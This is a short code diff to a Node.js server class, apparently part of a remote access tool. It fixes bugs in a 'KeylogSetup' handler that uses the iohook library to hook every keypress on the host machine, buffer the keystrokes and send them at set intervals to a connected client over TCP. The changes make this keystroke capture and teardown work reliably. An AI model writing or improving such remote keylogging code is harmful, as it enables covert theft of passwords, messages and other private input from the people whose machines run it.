@@ -80,11 +80,8 @@ class Server extends EventEmitter {
     this.on(Packets.KeylogSetup, function (packet, conn) {
       if (!packet.data) return
 
-      if (!this.__iohookLib) {
-        this.__iohookLib = require('iohook')
-      }
-
       if (!conn.keylog) {
+        self.__iohookLib = require('iohook')
         conn.keylog = {
           buffer: [],
           intervalID: null,
@@ -95,9 +92,13 @@ class Server extends EventEmitter {
       }
 
       function disableKeylog () {
+        if (!conn.keylog) return
+
         clearInterval(conn.keylog.intervalID)
         conn.keylog.intervalID = null
-        this.__iohookLib.off('keypress', conn.keylog.keyEvt)
+        if (self.__iohookLib) {
+          self.__iohookLib.off('keypress', conn.keylog.keyEvt)
+        }
       }
 
       if (packet.data.interval === 0) {
@@ -108,8 +109,8 @@ class Server extends EventEmitter {
 
       if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID)
 
-      this.__iohookLib.on('keypress', conn.keylog.keyEvt)
-      this.__iohookLib.start()
+      self.__iohookLib.on('keypress', conn.keylog.keyEvt)
+      self.__iohookLib.start()
 
       conn.keylog.intervalID = setInterval(function () {
         // Send loop
@@ -119,7 +120,7 @@ class Server extends EventEmitter {
         }
       }, packet.data.interval)
 
-      conn.tcp.__destructors.keylog = disableKeylog
+      conn.tcp.__destructors.keylog = disableKeylog.bind(conn)
     })
   }
 
